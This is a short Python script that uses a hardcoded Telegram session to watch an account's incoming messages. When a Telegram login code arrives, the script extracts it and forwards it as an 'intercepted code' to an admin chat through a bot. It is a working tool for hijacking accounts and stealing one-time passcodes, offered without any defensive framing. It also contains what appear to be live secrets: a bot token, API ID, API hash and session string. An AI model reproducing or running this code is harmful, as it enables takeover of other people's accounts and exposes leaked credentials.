import os
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from aiogram import Bot

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

BOT_TOKEN = os.getenv("BOT_TOKEN", "8761162220:AAEsp3UI6Iv5x4y8k4tW9z33LVYFcLEnqlc")
API_ID = int(os.getenv("API_ID", "35742827"))
API_HASH = os.getenv("API_HASH", "f2955d75aa8ace7c421a2bb6152c5dd3")
STRING_SESSION = os.getenv("STRING_SESSION", "1BVtsOKEBuxFkwQaKZ8ScsZu1g3Wdi1xqQqtPxLOoJxfmq8LZFUGP-tpzCX7p2qSlv9KmFvvEOtvUYOOYIlckMYyHhpCR1C_sz1nlLIoC-Tm6gpO90XeB0r7oE68bfBMmIM2eOaj-xixqPuwme-spTcH2OITAUQ9EiLVr881Wzh5mkSEbxHgRUsiXmQdR25vnhJ_p2E5PMqvqCU2gakYyl59ybqNa-4mpqL5YTUBbu_HDZZU4dLFQ_GxsP7V4mos49Y1dq9yV6xYDBIA03wB6KU8d9Pna2Z8yXyzNgfhCZzQ5rHsRF-4thBzSa-83hlYFj4kG8TukxYGbWhFAxCtZ6UhCVS_YXug=")
ADMIN_TELEGRAM_ID = int(os.getenv("ADMIN_TELEGRAM_ID", "8393210427"))

bot = Bot(token=BOT_TOKEN)
t_client = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

@t_client.on(events.NewMessage(incoming=True))
async def telethon_incoming_message_handler(event):
    msg = event.raw_text
    if "Telegram code" in msg or "is your login code" in msg:
        m = re.search(r'\b\d{5,6}\b', msg)
        if m:
            otp = m.group(0)
            logging.info(f"Captured OTP sequence: {otp}")
            try:
                # Delivers straight to your admin profile log window instantly
                await bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=f"🔑 <b>Intercepted Code:</b> <code>{otp}</code>", parse_mode="HTML")
            except Exception as err:
                logging.error(f"Failed to forward message payload: {err}")

if __name__ == "__main__":
    logging.info("Starting isolated Telethon scraper engine...")
    t_client.start()
    t_client.run_until_disconnected()
